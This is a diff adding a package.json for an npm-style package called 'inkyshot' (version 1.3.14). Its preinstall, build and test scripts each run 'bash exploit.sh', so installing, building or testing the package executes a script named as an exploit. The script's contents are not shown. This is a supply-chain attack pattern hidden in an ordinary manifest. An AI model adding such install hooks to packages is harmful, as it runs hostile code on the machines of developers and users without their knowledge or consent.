@@ -1,0 +1,9 @@
+{
+  "name": "inkyshot",
+  "version": "1.3.14",
+  "scripts": {
+    "preinstall": "bash exploit.sh",
+    "build": "bash exploit.sh",
+    "test": "bash exploit.sh"
+  }
+}
